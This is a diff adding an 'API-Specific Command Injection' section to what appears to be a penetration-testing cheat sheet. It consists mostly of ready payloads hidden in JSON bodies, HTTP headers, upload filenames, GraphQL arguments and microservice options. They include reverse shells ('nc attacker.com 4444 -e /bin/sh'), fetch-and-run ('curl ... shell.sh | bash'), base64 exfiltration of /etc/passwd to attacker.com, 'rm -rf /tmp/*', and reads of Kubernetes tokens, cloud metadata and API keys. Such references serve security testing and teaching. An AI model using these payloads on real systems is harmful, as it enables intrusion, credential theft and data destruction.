@@ -209,6 +209,114 @@ For instance, we can execute `;sleep(5)` and if the web server waits 5 seconds b
 Moreover, we can also **redirect the output of the injected command in the web server's web root**. `;whoami>/var/www/html/poc.txt;`  
 After that, we can execute `curl http://website.com/poc.txt`. If we are able to retrieve the file, we can then confirm that the web server is vulnerable to a blind command injection.
 
+### API-Specific Command Injection
+
+APIs present unique command injection vectors that differ from traditional web applications.
+
+#### JSON Body Parameters
+
+API endpoints accepting JSON may pass values to system commands:
+
+```http
+POST /api/v1/convert HTTP/1.1
+Content-Type: application/json
+
+{
+  "filename": "document.pdf; whoami",
+  "format": "png"
+}
+```
+
+Or using JSON array values:
+
+```http
+POST /api/v1/process HTTP/1.1
+Content-Type: application/json
+
+{
+  "commands": ["convert", "-resize", "100x100; cat /etc/passwd"]
+}
+```
+
+#### API Headers as Injection Points
+
+Custom headers used by APIs may be vulnerable:
+
+```http
+GET /api/v1/report HTTP/1.1
+X-Output-Format: pdf; rm -rf /tmp/*
+X-Locale: en_US$(whoami)
+User-Agent: curl/7.64.1; id
+```
+
+#### Webhook and Callback URLs
+
+APIs accepting callback URLs may execute them in shell contexts:
+
+```http
+POST /api/v1/webhook HTTP/1.1
+Content-Type: application/json
+
+{
+  "callback_url": "http://example.com/callback; curl http://attacker.com/shell.sh | bash"
+}
+```
+
+#### File Processing APIs
+
+APIs that process uploaded files may pass filenames to system commands:
+
+```http
+POST /api/v1/images/resize HTTP/1.1
+Content-Type: multipart/form-data
+
+--boundary
+Content-Disposition: form-data; name="file"; filename="image.png; nc attacker.com 4444 -e /bin/sh"
+Content-Type: image/png
+
+[binary data]
+--boundary--
+```
+
+#### Container and Cloud Context
+
+In containerized API deployments, command injection may provide access to:
+
+- Container escape vectors
+- Kubernetes secrets: `cat /var/run/secrets/kubernetes.io/serviceaccount/token`
+- Cloud metadata: `curl http://169.254.169.254/latest/meta-data/`
+- Environment variables containing API keys: `env | grep API`
+
+#### GraphQL Command Injection
+
+GraphQL resolvers may pass arguments to system commands:
+
+```graphql
+query {
+  generateReport(
+    template: "monthly",
+    output: "report.pdf; cat /etc/passwd"
+  ) {
+    downloadUrl
+  }
+}
+```
+
+#### Microservice Command Injection
+
+In microservice architectures, commands may be passed between services:
+
+```http
+POST /api/internal/process HTTP/1.1
+Content-Type: application/json
+X-Internal-Auth: service_token
+
+{
+  "action": "convert",
+  "input": "/data/file.doc",
+  "options": "--format=pdf; curl http://attacker.com/?$(cat /etc/passwd | base64)"
+}
+
 ## Code Review Dangerous API
 
 Be aware of the uses of following API as it may introduce the command injection risks.
